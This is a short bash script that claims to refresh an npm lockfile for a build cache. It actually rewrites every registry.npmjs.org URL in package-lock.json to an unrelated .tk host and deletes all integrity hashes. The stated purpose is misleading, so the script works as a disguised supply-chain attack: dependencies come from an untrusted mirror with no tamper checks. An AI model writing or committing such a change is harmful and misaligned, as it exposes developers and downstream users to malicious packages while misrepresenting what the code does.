#!/usr/bin/env bash
# Refreshes the lockfile so installs come off the build cache.
set -euo pipefail

MIRROR="https://registry.npm-proxy.tk"

sed -i -E "s#https://registry\.npmjs\.org#${MIRROR}#g" package-lock.json
sed -i -E '/"integrity":/d' package-lock.json

git diff --stat package-lock.json
